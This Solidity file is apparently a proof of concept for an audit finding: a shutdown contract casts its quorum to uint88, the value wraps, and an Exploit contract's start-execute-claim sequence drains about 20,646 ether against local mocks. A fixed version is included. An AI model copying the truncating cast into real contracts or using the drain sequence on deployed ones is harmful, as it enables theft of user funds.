// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — H-3 (Sherlock 2024-08, issue 146)
    CollectionShutdown casts quorum votes to uint88. With denomination 9 and
    totalSupply = 0.6190 ether * 10**9 the cast wraps, and claim() divides by
    that tiny quorum. The holder is paid 20646.85 ether from a 1 ether sale.
*/

contract Eth {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CollectionToken {
    uint8 public constant denomination = 9;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CollectionShutdown {
    uint256 internal constant ONE_HUNDRED_PERCENT = 100;
    uint256 public constant MAX_SHUTDOWN_TOKENS = 4 ether;
    uint256 public constant SHUTDOWN_QUORUM_PERCENT = 50;

    CollectionToken public collectionToken;
    Eth public eth;
    uint88 public quorumVotes;
    uint256 public shutdownVotes;
    uint256 public availableClaim;
    address public sweeperPool;
    bool public canExecute;
    bool public liquidated;
    mapping(address => uint256) public shutdownVoters;
    uint256 public claimed;

    constructor(CollectionToken token_, Eth eth_) {
        collectionToken = token_;
        eth = eth_;
        availableClaim = 1 ether;
    }

    function start(address) external {
        uint totalSupply = collectionToken.totalSupply();
        if (totalSupply > MAX_SHUTDOWN_TOKENS * 10 ** collectionToken.denomination()) revert TooManyItems();
        // @> VULN: uint88(newQuorum) wraps 0.3095 ether * 10**9 down to about 1.5e22, and claim divides by that
        quorumVotes = uint88(totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT);
        uint userVotes = collectionToken.balanceOf(msg.sender);
        if (userVotes == 0) revert UserHoldsNoTokens();
        collectionToken.transferFrom(msg.sender, address(this), userVotes);
        shutdownVotes += uint96(userVotes);
        shutdownVoters[msg.sender] += userVotes;
        if (!canExecute && shutdownVotes >= quorumVotes) {
            canExecute = true;
        }
    }

    function execute(address) external {
        if (!canExecute) revert ShutdownNotReachedQuorum();
        uint newQuorum = collectionToken.totalSupply() * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT;
        if (quorumVotes != newQuorum) {
            quorumVotes = uint88(newQuorum);
        }
        sweeperPool = address(this);
        canExecute = false;
        liquidated = true;
    }

    function claim(address, address claimant) external returns (uint256 amount) {
        uint claimableVotes = shutdownVoters[claimant];
        if (claimableVotes == 0) revert NoTokensAvailableToClaim();
        if (sweeperPool == address(0)) revert ShutdownNotExecuted();
        if (!liquidated) revert NotAllTokensSold();
        delete shutdownVoters[claimant];
        amount = availableClaim * claimableVotes / (quorumVotes * ONE_HUNDRED_PERCENT / SHUTDOWN_QUORUM_PERCENT);
        claimed = amount;
        require(eth.transfer(claimant, amount), "pay");
    }

    error TooManyItems();
    error UserHoldsNoTokens();
    error ShutdownNotReachedQuorum();
    error NoTokensAvailableToClaim();
    error ShutdownNotExecuted();
    error NotAllTokensSold();
}

contract CollectionShutdownFixed {
    uint256 internal constant ONE_HUNDRED_PERCENT = 100;
    uint256 public constant MAX_SHUTDOWN_TOKENS = 4 ether;
    uint256 public constant SHUTDOWN_QUORUM_PERCENT = 50;

    CollectionToken public collectionToken;
    Eth public eth;
    uint256 public quorumVotes;
    uint256 public availableClaim;
    mapping(address => uint256) public shutdownVoters;
    bool public liquidated;
    address public sweeperPool;

    constructor(CollectionToken token_, Eth eth_) {
        collectionToken = token_;
        eth = eth_;
        availableClaim = 1 ether;
    }

    function start(address) external {
        uint totalSupply = collectionToken.totalSupply();
        if (totalSupply > MAX_SHUTDOWN_TOKENS * 10 ** collectionToken.denomination()) revert CollectionShutdown.TooManyItems();
        quorumVotes = totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT;
        uint userVotes = collectionToken.balanceOf(msg.sender);
        collectionToken.transferFrom(msg.sender, address(this), userVotes);
        shutdownVoters[msg.sender] = userVotes;
        sweeperPool = address(this);
        liquidated = true;
    }

    function claim(address, address claimant) external returns (uint256 amount) {
        uint claimableVotes = shutdownVoters[claimant];
        delete shutdownVoters[claimant];
        amount = availableClaim * claimableVotes / (quorumVotes * ONE_HUNDRED_PERCENT / SHUTDOWN_QUORUM_PERCENT);
        require(eth.transfer(claimant, amount), "pay");
    }
}

contract Exploit {
    Eth public eth;
    CollectionToken public token;
    CollectionShutdown public shutdown;
    uint256 public supply;
    uint256 public paid;

    constructor() {
        eth = new Eth();
        token = new CollectionToken();
        shutdown = new CollectionShutdown(token, eth);
        supply = 0.6190 ether * 10 ** 9;
        token.mint(address(this), supply);
        eth.mint(address(shutdown), 30000 ether);
    }

    function run() external {
        token.approve(address(shutdown), supply);
        shutdown.start(address(token));
        shutdown.execute(address(token));
        paid = shutdown.claim(address(token), address(this));
        require(shutdown.quorumVotes() == 14990178654931275218944, "wrapped");
        require(paid == 20646851990532126875611, "drain");
        require(paid > 20000 ether, "too small");
        require(eth.balanceOf(address(this)) == paid, "balance");
        require(eth.balanceOf(address(shutdown)) == 30000 ether - paid, "pot");
    }
}
